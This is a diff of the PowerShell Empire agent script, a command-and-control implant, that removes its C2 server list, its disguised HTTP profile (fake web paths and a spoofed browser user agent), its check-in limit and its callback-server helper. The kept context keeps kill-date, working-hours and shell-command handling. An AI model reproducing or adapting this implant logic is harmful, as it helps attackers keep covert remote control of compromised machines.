@@ -17,9 +17,6 @@ function Invoke-Empire {
         .PARAMETER SessionID
         A unique alphanumeric sessionID to use for identification
 
-        .PARAMETER Servers
-        Array of C2 servers to use
-
         .PARAMETER KillDate
         Kill date limit for agent operation
 
@@ -29,15 +26,6 @@ function Invoke-Empire {
         .PARAMETER WorkingHours
         Working hours for agent operation, format "8:00,17:00"
 
-        .PARAMETER Profile
-        http communication profile
-        request_uris(comma separated)|UserAgents(comma separated)
-
-        .PARAMETER LostLimit
-        The limit of the number of checkins the agent will miss before exiting
-
-        .PARAMETER DefaultResponse
-        A base64 representation of the default response for the given transport.
     #>
 
     param(
@@ -59,9 +47,6 @@ function Invoke-Empire {
         [Double]
         $AgentJitter = 0,
 
-        [String[]]
-        $Servers,
-
         [String]
         $KillDate,
 
@@ -73,15 +58,6 @@ function Invoke-Empire {
 
         [object]
         $ProxySettings,
-
-        [String]
-        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-        [Int32]
-        $LostLimit = 60,
-
-        [String]
-        $DefaultResponse = ""
     )
 
     ############################################################
@@ -117,24 +93,6 @@ function Invoke-Empire {
 
     if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
         $script:KillDate = $KillDate
-    }
-
-    # get all the headers/etc. in line for our comms
-    #   Profile format:
-    #       uris(comma separated)|UserAgent|header1=val|header2=val2...
-    #       headers are optional. format is "key:value"
-    #       ex- cookies are "cookie:blah=123;meh=456"
-    $ProfileParts = $Profile.split('|')
-    $script:TaskURIs = $ProfileParts[0].split(',')
-    $script:UserAgent = $ProfileParts[1]
-    $script:SessionID = $SessionID
-    $script:Headers = @{}
-    # add any additional request headers if there are any specified in the profile
-    if($ProfileParts[2]) {
-        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
-            $Parts = $_.Split(':')
-            $script:Headers.Add($Parts[0],$Parts[1])
-        }
     }
 
     # keep track of all background jobs
@@ -249,14 +207,6 @@ function Invoke-Empire {
         $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
         $str
     }
-
-    # # TODO: add additional callback servers ?
-    # function Add-Servers {
-    #     param([string[]]$BackupServers)
-    #     foreach ($backup in $BackupServers) {
-    #         $Script:ControlServers = $Script:ControlServers + $backup
-    #     }
-    # }
 
     # handle shell commands and return any results
     function Invoke-ShellCommand {
